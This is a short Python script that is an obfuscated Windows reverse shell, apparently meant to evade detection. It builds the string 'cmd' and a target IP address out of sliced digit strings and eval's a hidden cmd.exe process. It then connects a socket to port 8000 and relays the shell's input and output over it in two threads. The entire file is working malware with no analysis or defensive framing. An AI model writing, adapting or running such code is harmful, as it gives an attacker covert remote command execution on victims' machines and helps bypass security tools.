import socket,os,threading,subprocess as sp
CREATE_NO_WINDOW = 0x08000000


numbers2 = "1234567890"
numbers2 = numbers2[2:4]
numbers2 = numbers2[0:1]
int(numbers2)
if int(numbers2) == 3:
    makecd = "cdm"
    makecd1 = makecd[0:1]
    makecd2 = makecd[2:3]
    makecd3 = makecd[1:-1]
    fncd = makecd1+makecd2+makecd3
    print(fncd)
numbers = "1234567890"
numbers = numbers[0:3]
numbers = numbers[0:2]
int(numbers)
if int(numbers) == 12:
    parm = f"(['{fncd}'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT,creationflags=CREATE_NO_WINDOW)"
    string = "sp.Popen"+parm
    print(string)


scknum = "1234567890"
scknum1 = scknum[0:1]
scknum2 = scknum[8:-1]
scknum3 = scknum[1:2]
scknum4 = scknum1+scknum2+scknum3
scknum5 = scknum[5:-4]
scknum6 = scknum[7:-2]
scknumf = scknum4+"."+scknum1+scknum5+scknum6
il = scknumf+"."+scknum1+"."+scknum1+scknum6



    
p = eval(string)
#p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT,creationflags=CREATE_NO_WINDOW)

s=socket.socket()
s.connect((il,8000))


threading.Thread(target=exec,args=("while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)",globals()),daemon=True).start()
threading.Thread(target=exec,args=("while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)",globals())).start()

